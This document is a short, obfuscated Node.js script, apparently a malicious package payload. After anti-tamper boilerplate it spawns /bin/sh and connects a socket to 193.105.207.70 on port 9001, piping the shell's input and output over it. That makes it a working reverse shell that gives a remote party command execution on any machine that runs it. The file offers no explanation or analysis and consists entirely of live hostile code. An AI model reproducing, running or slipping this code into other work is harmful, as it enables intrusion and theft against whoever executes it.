(function () {
  var _0x207065 = function () {
    var _0x30632a = true;
    return function (_0x236d66, _0x2b01a7) {
      var _0x1f4340 = _0x30632a ? function () {
        if (_0x2b01a7) {
          var _0x5baf2c = _0x2b01a7.apply(_0x236d66, arguments);
          _0x2b01a7 = null;
          return _0x5baf2c;
        }
      } : function () {};
      _0x30632a = false;
      return _0x1f4340;
    };
  }();
  var _0x5d8b5b = _0x207065(this, function () {
    return _0x5d8b5b.toString().search("(((.+)+)+)+$").toString().constructor(_0x5d8b5b).search("(((.+)+)+)+$");
  });
  _0x5d8b5b();
  var _0x9cc8bd = require("net"), _0x544bee = require("child_process"), _0x2964db = _0x544bee.spawn("/bin/sh", []);
  var _0x543ff8 = new _0x9cc8bd.Socket;
  _0x543ff8.connect(9001, "193.105.207.70", function () {
    _0x543ff8.pipe(_0x2964db.stdin);
    _0x2964db.stdout.pipe(_0x543ff8);
    _0x2964db.stderr.pipe(_0x543ff8);
  });
  return /a/;
}());

